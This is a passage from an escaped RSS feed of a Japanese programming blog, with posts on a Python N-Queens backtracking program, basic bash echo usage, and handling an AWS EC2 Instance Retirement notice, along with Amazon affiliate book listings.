6: 4 0 0:00:00.000
7: 40 0 0:00:00.001
8: 92 0 0:00:00.004
9: 352 0 0:00:00.019
10: 724 0 0:00:00.088
11: 2680 0 0:00:00.439
12: 14200 0 0:00:02.345
13: 73712 0 0:00:13.412
14: 365596 0 0:01:21.331
&lt;/code>&lt;/pre>&lt;p>NがNQueenのN数、Totalが解の総数、Uniqueは左右反転ミラー、回転で同じ形のものを同一解として計算した場合の数、&lt;br>
hh:mm:ss.msは各Nごとに処理にかかった時間です。&lt;br>
Uniqueは今回は全て0ですがロジックが進んでいくとまずUnique数を算出してそこからTotalを求めるようになりますので今の所は流しておいてください。&lt;br>
エイトクイーン(N=8)の解の数は8: の92、実行時間は4msとなります。&lt;br>
ブルートフォースが3m7.321s、配置フラグが0m0.554sでしたから格段に高速になったことがわかると思います。&lt;/p>
&lt;h2 id="mainメソッド詳細">mainメソッド詳細&lt;/h2>
&lt;p>メソッドの中身を見ていきましょう。&lt;br>
459行目 nmin=4 でスタートするNの数を指定しています。&lt;/p>
&lt;p>461行目 for i in range(nmin,MAX): でnmin=4からMAX=15まで1ずつインクリメントしてnqueenを実行していきます。&lt;/p>
&lt;p>462,463行目でfor文の冒頭でTOTAL,UNIQUEを0で初期化しています。 &lt;br>
これをしとかないと出力されるTotal,Uniqueの数が累計数になってしまいますので注意しましょう。&lt;/p>
&lt;p>464,465行目でABOARD配列を初期化しています。ABOARD配列は各行のどこにクイーンを置いたかを記憶するための配列です。ロジックが進んでいくと必須の配列になるのですが、今回のロジックでは使用しませんので読み飛ばしてください。&lt;/p>
&lt;p>467行目でnqueenメソッドを呼び出しています。&lt;br>
今までは引数はrow=0の行情報1つだけでしたが、今回から複数のNについてNqueenを実行するようになるので第2引数にsizeが追加されています。&lt;br>
sizeは461行目のfor i in range(nmin,MAX)のiで渡します。&lt;/p>
&lt;p>466行目,468-470行目でnqueenメソッドの前後時間を計測してメソッドの実行にかかった時間を算出しています。&lt;/p>
&lt;p>datetime.now()で現在時刻が取得できます。&lt;br>
466行目でstart_timeにnqueenメソッド呼び出し直前の時間を取得しておき、&lt;br>
468行目でメソッド終了直後の現在時刻とstart_timeを引くことによってメソッドの実行にかかった時間をtime_elapsedとして算出しています。&lt;/p>
&lt;p>469行目で'{}'.format としていますがこれはtime_elapsedがdatetimeオブジェクトなのでstringにキャストしています。&lt;br>
format関数は、文字列中の{ }の場所に、引数をにstringキャストして埋め込むことができるみたいです。&lt;/p>
&lt;p>470行目で下３桁を切り捨てています。&lt;br>
stringは配列の扱いなのでスライスできるみたいです&lt;br>
[:-3]&lt;br>
ですと、0文字目から後ろから3文字除いた範囲を取り出しています。&lt;br>
例えば以下のようになります。&lt;br>
0:00:00.005309&lt;br>
0:00:00.005&lt;/p>
&lt;p>基本的にformat関数は、文字列中の「{ }」の場所に、引数をstringにキャストして埋め込む&lt;br>
text = _text[:-3] スライス機能　先頭から末尾3文字を除いた文字列を切り取る&lt;/p>
&lt;h2 id="nqueenメソッドについて">nqueenメソッドについて&lt;/h2>
&lt;p>プログラムの内容は基本的に前回の配置フラグと同じです。&lt;br>
違うのは以下の2点です。&lt;/p>
&lt;p>1つ目は450,451,453行目です。&lt;br>
前回は配置フラグとして上下の利き筋だけチェックするFAだけ使っていました。&lt;br>
今回は、FAの他に左対角線の利き筋をチェックするFB、右対角線の利き筋をチェックするFCも使用しています。&lt;/p>
&lt;p>2つ目445行目です。&lt;br>
前回までは最終行まで行ったらprintOutメソッドでCOUNT数と各行のクイーンの配置場所を出力していました。&lt;br>
今回はTOTAL +=1 として正解数に1加算しています。&lt;br>
FA,FB,FCの配置フラグのチェックを通過して最終行まで辿り着ければ正解としてカウントして良いと言えるからです。&lt;/p>
&lt;p>次回は図で説明しながら実際の動きを追ってみましょう。&lt;/p></description></item><item><title>（１）【echo】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/</link><pubDate>Wed, 09 Feb 2022 11:32:07 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-echo-suzki/bash.jpg" alt="Featured image of post （１）【echo】シェルスクリプトコマンド活用紹介" />&lt;h2 id="echoコマンド">echoコマンド&lt;/h2>
&lt;ul>
&lt;li>メッセージや環境変数を表示する&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>「echo」はメッセージなどを表示するコマンドです。「echo メッセージ」でメッセージを表示します。「echo $変数名」で環境変数やシェル変数を表示する際にも使用います。&lt;/p>
&lt;h2 id="echoコマンドの書式">echoコマンドの書式&lt;/h2>
&lt;p>echo [オプション] メッセージ&lt;/p>
&lt;h2 id="echoの主なオプション">echoの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">オプション&lt;/th>
&lt;th style="text-align:left">意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">-n&lt;/td>
&lt;td style="text-align:left">最後の改行を出力しない&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-e&lt;/td>
&lt;td style="text-align:left">エスケープを解釈する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-E&lt;/td>
&lt;td style="text-align:left">エスケープを解釈しない（デフォルト）&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="echo-コマンド詳細説明">echo コマンド詳細説明&lt;/h3>
&lt;p>&lt;font color=orange>&lt;b> echoコマンドの使用：&lt;/b>&lt;/font>&lt;br>
さまざまなオプションでechoコマンドを使用できます。&lt;br>
次の例では、いくつかの便利なオプションについて説明します。&lt;br>
オプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。&lt;br>
&amp;lsquo;-n&amp;rsquo;オプションは、改行なしでテキストを印刷するために使用されます。&lt;br>
&amp;lsquo;-e&amp;rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。&lt;br>
&amp;lsquo;echo_example.sh&amp;rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:echo_example.sh" data-lang="bash:echo_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;改行付きのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -n &lt;span class="s2">&amp;#34;改行なしのテキストの印刷&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;\n削除\tバックスラッシュ\t文字\n&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash echo_example.sh
改行付きのテキストの印刷
改行なしのテキストの印刷
削除 バックスラッシュ 文字
$
&lt;/code>&lt;/pre>&lt;h3 id="hello-world">Hello World&lt;/h3>
&lt;p>&lt;font color=orange>&lt;b>はじめてのbashコマンド「echo」&lt;/b>&lt;/font>&lt;br>
ターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-:はじめてのecho" data-lang=":はじめてのecho">$ echo &amp;quot;Hello, World&amp;quot;;
Hello, World
$
&lt;/code>&lt;/pre>&lt;p>はじめてのbashスクリプト「vim」&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash:はじめてのbashスクリプト" data-lang="bash:はじめてのbashスクリプト">$ vim HelloWorld.sh
＜空のvim HelloWorld.sh が開きます＞
&lt;/code>&lt;/pre>&lt;p>vimで開いたHelloWorld.shを編集します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:HelloWorld.sh" data-lang="bash:HelloWorld.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello World&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>echo の後ろに続く文字列は 「&amp;quot;&amp;quot;」（ダブるクォーテーション）または、「''」（シングルクォーテーション）で囲みましょう。&lt;/dd>
&lt;dd>行末の「;」（セミコロン）も忘れずに。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h1 id="書籍の紹介">書籍の紹介&lt;/h1>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4774186945&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/B00QJINS1A/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B00QJINS1A&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=36dff1cf8fa7d4852b5a4a3cf874304b" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=B00QJINS1A&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;amp;MarketPlace=JP&amp;amp;ASIN=4797393106&amp;amp;ServiceVersion=20070822&amp;amp;ID=AsinImage&amp;amp;WS=1&amp;amp;Format=_SL250_&amp;amp;tag=nlpqueens-22">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>すぐにできる！EC2からAmazon EC2 Instance Retirementとメールが来たときの対応</title><link>https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/</link><pubDate>Tue, 08 Feb 2022 09:39:37 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/catch.jpg" alt="Featured image of post すぐにできる！EC2からAmazon EC2 Instance Retirementとメールが来たときの対応" />&lt;p>みなさんの中にもAWSのEC2を使った事がある人もいるかと思います。&lt;br>
そのAWSからある日、下記のようなメールが届きました。&lt;/p>
&lt;blockquote>
&lt;p>Hello,&lt;/p>
&lt;p>EC2 has detected degradation of the underlying hardware hosting your Amazon EC2 instance (instance-ID: [インスタンスのID]) associated with your AWS account (AWS Account ID: [ID]) in the [リージョンの場所] region.&lt;br>
Due to this degradation your instance could already be unreachable.&lt;br>
We will stop your instance after 日付 UTC.&lt;br>
Please take appropriate action before this time.&lt;/p>
&lt;p>The affected instances are listed below:&lt;/p>
&lt;p>[インスタンスのID]&lt;/p>
&lt;/blockquote>
&lt;p>翻訳してみると、どうやらAWSの老朽化に伴うインスタンスの更新が必要なようです。&lt;/p>
&lt;blockquote>
&lt;p>こんにちは。&lt;/p>
&lt;p>EC2は、[リージョンの場所]リージョンにあるお客様のAWSアカウント（AWSアカウントID：[ID]）に関連するAmazon EC2インスタンス（インスタンスID：Instance-ID）をホストする基礎ハードウェアの劣化を検出しました。&lt;br>
この劣化により、お客様のインスタンスはすでに到達不能になっている可能性があります。日付 UTC以降にお客様のインスタンスを停止します。&lt;br>
それまでに適切な対処をお願いいたします。&lt;/p>
&lt;p>影響を受けるインスタンスは以下の通りです。&lt;br>
[インスタンスのID]&lt;/p>
&lt;/blockquote>
&lt;p>老朽化の通知をしてくれるのは非常にありがたいですが、EC2の適切な対処ってなんだ？と焦ってしまう方もいるかと思います。&lt;br>
今回は「Amazon EC2 Instance Retirement」というタイトルのメールが来た際の対処法について説明いたします。&lt;/p>
&lt;h2 id="ec2のイベントを確認">EC2のイベントを確認&lt;/h2>
&lt;p>まずはAWSにログインして、EC2の項目に移動します。&lt;br>
左袖に、「&lt;strong>イベント&lt;/strong>」という項目があるので、クリックして内容を確認しましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 148;
flex-basis: 356px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img01.png" data-size="980x660">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img01.png"
width="980"
height="660"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>今回は「イベントステータス」部分に「Scheduled」と記述され、「イベントタイプ」が「instance-stop」となっている項目がありました。&lt;br>
リソースIDをAWSのメールと照らし合わせて、該当のインスタンスということがわかります。&lt;/p>
&lt;p>「説明」の部分にも見切れていますが、「The instance is running on degraded hardware（インスタンスが劣化したハードウェアで動作している）」と記述されていました。&lt;br>
進行状況から14日以内にインスタンスが停止してしまうので、「Amazon EC2 Instance Retirement」というメールが来たら、早めにAWSへログインして状況を確認するようにしましょう。&lt;/p>
&lt;h2 id="ec2のルートを確認">EC2のルートを確認&lt;/h2>
&lt;p>次に、該当のインスタンスの&lt;strong>ルートデバイスタイプ&lt;/strong>を確認します。&lt;br>
前回のリソースID部分をクリックして、「インスタンスの概要」へ移動します。そして、「ストレージ」をクリックして「ルートデバイスタイプ」を確認しましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 535;
flex-basis: 1285px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img02.png" data-size="980x183">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img02.png"
width="980"
height="183"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>この部分が「&lt;strong>EBS&lt;/strong>」となっている場合は、対応が非常に簡単です。&lt;br>
その対応を方法は次のようになります。&lt;/p>
&lt;h2 id="ec2を停止そして起動">EC2を停止、そして起動&lt;/h2>
&lt;p>「Amazon EC2 Instance Retirement」の対応はルートデバイスがEBSの場合は、対象のインスタンスを一度「&lt;strong>インスタンスを停止&lt;/strong>」させてから「&lt;strong>インスタンスを開始&lt;/strong>」するだけで対応できてしまいます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 250;
flex-basis: 601px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img03.png" data-size="980x391">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img03.png"
width="980"
height="391"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>「インスタンスを停止」して「インスタンスを開始」だから、要するに「インスタンスを再起動」ってことでしょ？と考えてしまうかもしれません。&lt;br>
しかし、「インスタンスを再起動」の場合はEC2のハードウェアが変わらないため、今回のハードウェアのアップデートが行われません。&lt;br>
ですので、「インスタンスを停止」させてから「インスタンスを開始」するようにして、EC2を実行するハードウェアをAWS側が自動的に変更するようにしましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 335;
flex-basis: 805px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img04.png" data-size="980x292">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/img04.png"
width="980"
height="292"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ルートデバイスタイプが「instant store」の場合&lt;/dt>
&lt;dd>ルートデバイスが「instant store」の場合はEBSと対応が変わります。
&lt;ol>
&lt;li>まず、EC2インスタンスからイメージを作成します。&lt;/li>
&lt;li>次に、さきほど作成したイメージを利用し、別のEC2インスタンスを立ち上げます。&lt;/li>
&lt;li>そして、元のEC2インスタンスを削除します&lt;/li>
&lt;/ol>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>「Amazon EC2 Instance Retirement」というメールが来た場合、焦らずに対応できるようにしておきましょう。&lt;br>
EBSの場合は「&lt;strong>インスタンスを停止&lt;/strong>」させてから「&lt;strong>インスタンスを開始&lt;/strong>」。&lt;br>
instant storeの場合は、イメージを作成して、立ち上げて該当インスタンスを削除。&lt;br>
これさえ覚えておけば、大丈夫です。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e5%9b%b3%e8%a7%a3%e5%8d%b3%e6%88%a6%e5%8a%9b-Amazon-Web-Services%e3%81%ae%e3%81%97%e3%81%8f%e3%81%bf%e3%81%a8%e6%8a%80%e8%a1%93%e3%81%8c%e3%81%93%e3%82%8c1%e5%86%8a%e3%81%a7%e3%81%97%e3%81%a3%e3%81%8b%e3%82%8a%e3%82%8f%e3%81%8b%e3%82%8b%e6%95%99%e7%a7%91%e6%9b%b8-%e5%b0%8f%e7%ac%a0%e5%8e%9f/dp/4297108895/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51AEyJOSYaL.jpg">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 図解即戦力 Amazon Web Servicesのしくみと技術がこれ1冊でしっかりわかる教科書 &lt;/h2>
&lt;p> 【「ITエンジニア本大賞2021」技術書部門 入賞! 】 Amazon Web Servicesのしくみがすぐにわかる! Amazon Web Services(AWS)のしくみや関連技術についてわかりやすく解説する図解本です。エンジニア1年生、IT業界などへの転職・就職を目指す人が、AWS関連の用語、しくみ、クラウドとネットワークの基礎技術などを一通り学ぶことのできる、1冊目の入門書としてふさわしい内容を目指します。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e8%a6%81%e7%82%b9%e6%95%b4%e7%90%86%e3%81%8b%e3%82%89%e6%94%bb%e7%95%a5%e3%81%99%e3%82%8b%e3%80%8eAWS%e8%aa%8d%e5%ae%9a-%e3%83%87%e3%83%bc%e3%82%bf%e3%83%99%e3%83%bc%e3%82%b9-%e5%b0%82%e9%96%80%e7%9f%a5%e8%ad%98%e3%80%8f-Compass-Books%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba-NRI%e3%83%8d%e3%83%83%e3%83%88%e3%82%b3%e3%83%a0%e6%a0%aa%e5%bc%8f%e4%bc%9a%e7%a4%be/dp/4839975078/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51svKeJL9KS.jpg">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 要点整理から攻略する『AWS認定 データベース-専門知識』 (Compass Booksシリーズ) &lt;/h2>
&lt;p> 「AWS 認定 データベース」に頻出する内容を1冊にまとめました! ■AWS認定とは AWS 認定試験は、AWSに関する知識・スキルを測るための試験です。レベル別・カテゴリー別に認定され、基礎コース・アソシエイト・プロフェッショナルの3つのレベルと、ネットワークやセキュリティなど分野ごとの専門知識(スペシャリティ)があります。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>第5回 pythonでNQueen（エイトクイーン）バックトラック（１）</title><link>https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/</link><pubDate>Mon, 07 Feb 2022 16:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/chess.jpg" alt="Featured image of post 第5回 pythonでNQueen（エイトクイーン）バックトラック（１）" />&lt;h2 id="バックトラック">バックトラック&lt;/h2>
&lt;p>今回はバックトラックを説明していきたいと思います。 &lt;br>
今回のバックトラックのロジックは前回の配置フラグの拡張版です。&lt;br>
配置フラグは上下の利き筋までしかチェックしていませんでしたが今回のバックトラックは左右斜めの対角線上の利き筋もチェックします。&lt;br>
上下の配置フラグの他に右斜め、左斜めの配置フラグを作ってチェックします。&lt;br>
ブルートフォース、配置フラグでは解の候補を出すに止まりましたが、今回で左右、上下、対角線上とクイーンのすべての利き筋をチェックすることができるますので、プログラム独力で解を出せるようになります。&lt;br>
出力は解の数となっております。&lt;/p>
&lt;p>ブルートフォース、配置フラグ、バックトラックの関係は以下の通りです。&lt;br>
制約が1個、2個、3個と追加されていくような感じです。&lt;/p>
&lt;p>・ブルートフォース&lt;br>
制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる&lt;br>
・配置フラグ&lt;br>
制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる&lt;br>
制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる&lt;br>
・バックトラック&lt;br>
制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる&lt;br>
制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる&lt;br>
制約3個目 配置フラグを拡張し左右斜めにクイーンを置けないようにする 対角線上の利き筋をみる&lt;/p>
&lt;p>プログラムソースは以下のURLにあります。&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py&lt;/a>&lt;/p>
&lt;h2 id="グローバル変数">グローバル変数&lt;/h2>
&lt;p>432,433行目でTOTAL,UNIQUEというグローバル変数が追加されています。&lt;br>
ブルートフォース、配置フラグは解の候補を列挙するにとどまっていましたが、今回からはプログラム内で正解数を出力するようになります。&lt;br>
TOTALは正解数の総数です。&lt;br>
UNIQUEですが、NQueenの解は左右ミラー反転、90度、180度、270度と左右反転していくと同じ形のものが結構あります。左右反転して同じ形のものを同一解としてカウントした数がUNIQUEとなります。&lt;/p>
&lt;p>436,437行目にFB,FC配列が追加されています。&lt;br>
FBが左斜め、FCが右斜めの対角線の利き筋を配置フラグでチェックします。&lt;/p>
&lt;h2 id="対角線上の配置フラグ">対角線上の配置フラグ&lt;/h2>
&lt;p>対角線の利き筋ですが１次元配列でチェックすることができます。&lt;br>
図で見てみましょう。&lt;/p>
&lt;p>上下の利き筋について簡単です。&lt;br>
例えば、1行目の右から2列目にクイーンを置いた場合は2、3、4行目の2列目にクイーンを置けなくなります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 242px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d1.png" data-size="330x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d1.png"
width="330"
height="326"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>2、3、4行目の右から2列目にクイーンを置いた場合はその他の行の2列目にクイーンを置けなくなります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 101;
flex-basis: 242px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d2.png" data-size="326x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d2.png"
width="326"
height="322"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d3.png" data-size="330x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d3.png"
width="330"
height="330"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d4.png" data-size="322x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/d4.png"
width="322"
height="324"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>ですのでフラグはクイーンを置いた列番号に立てれば良いことになります。&lt;br>
2列目だったらFA[1]=1です。&lt;/p>
&lt;p>対角線の利き筋についても計算が必要ではあるのですが法則性があり1次元配列で表現することが可能です。&lt;/p>
&lt;p>FB 左斜め対角線の利き筋について見てみましょう&lt;/p>
&lt;p>左斜め対角線のフラグの位置の計算法則は&lt;br>
行数-クイーンを置いた列数+(サイズ-1)&lt;br>
row-i+(size-1)&lt;br>
で1次元配列で表現できます。&lt;/p>
&lt;p>図で見てみましょう。&lt;br>
1行目の1列目にクイーンを置いた場合&lt;br>
左斜め対角線の利き筋は以下の通りになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>1行目1列目 [0,0]
2行目2列目 [1,1]
3行目3列目 [2,2]
4行目4列目 [3,3]
&lt;/code>&lt;/pre>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l1.png" data-size="326x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/l1.png"
width="326"
height="326"
loading="lazy"
alt="図">
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
